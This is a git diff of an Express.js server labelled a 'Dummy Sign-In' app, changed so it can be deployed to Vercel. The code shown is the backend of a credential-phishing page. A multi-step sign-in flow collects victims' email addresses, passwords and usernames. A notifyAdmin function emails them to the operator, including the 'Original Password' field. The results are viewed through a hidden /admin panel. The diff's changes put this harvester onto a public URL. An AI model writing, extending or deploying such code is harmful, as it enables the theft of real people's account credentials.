@@ -22,7 +22,7 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Hidden admin panel at /admin
+// Hidden admin panel – available at /admin on your Vercel URL
 app.get('/admin', (req, res) => {
   res.sendFile(path.join(__dirname, 'views', 'admin.html'));
 });
@@ -120,7 +120,7 @@ app.post('/api/step1', async (req, res) => {
   });
 });
 
-// Step 2: Username + Confirm Password (must match original password)
+// Step 2: Username + Confirm Password
 app.post('/api/step2', async (req, res) => {
   const { sessionId, username, confirmPassword } = req.body;
   const session = sessions.get(sessionId);
@@ -129,9 +129,7 @@ app.post('/api/step2', async (req, res) => {
     return res.status(400).json({ success: false, message: 'Invalid or expired session. Please restart.' });
   }
 
-  // Check if the confirmed password matches the original one
   if (confirmPassword !== session.password) {
-    // Notify admin of the failed attempt
     await notifyAdmin('Password confirmation FAILED', {
       Email: session.email,
       'Original Password': session.password,
@@ -143,7 +141,6 @@ app.post('/api/step2', async (req, res) => {
       Status: 'Password did not match – user must restart'
     });
 
-    // Delete the session so user has to start over
     sessions.delete(sessionId);
 
     return res.json({
@@ -152,7 +149,6 @@ app.post('/api/step2', async (req, res) => {
     });
   }
 
-  // Password matched
   session.username = username || '';
 
   await notifyAdmin('Username + Password confirmed', {
@@ -255,13 +251,18 @@ app.post('/api/admin-login', (req, res) => {
   res.json({ success: false, message: 'Wrong email or password' });
 });
 
-// Start server
-app.listen(PORT, () => {
-  console.log(`\nDummy Sign-In server running at http://localhost:${PORT}`);
-  console.log(`User page  → http://localhost:${PORT}/`);
-  console.log(`Admin panel → http://localhost:${PORT}/admin   (hidden)`);
-  console.log(`Admin email: ${process.env.GMAIL_USER || '(not set)'}`);
-  if (!process.env.GMAIL_APP_PASSWORD) {
-    console.warn('WARNING: GMAIL_APP_PASSWORD is not set in .env');
-  }
-});
+// Export the Express app for Vercel
+module.exports = app;
+
+// Only start the server when running locally (not on Vercel)
+if (require.main === module) {
+  app.listen(PORT, () => {
+    console.log(`\nDummy Sign-In server running at http://localhost:${PORT}`);
+    console.log(`User page  → http://localhost:${PORT}/`);
+    console.log(`Admin panel → http://localhost:${PORT}/admin   (hidden)`);
+    console.log(`Admin email: ${process.env.GMAIL_USER || '(not set)'}`);
+    if (!process.env.GMAIL_APP_PASSWORD) {
+      console.warn('WARNING: GMAIL_APP_PASSWORD is not set in .env');
+    }
+  });
+}
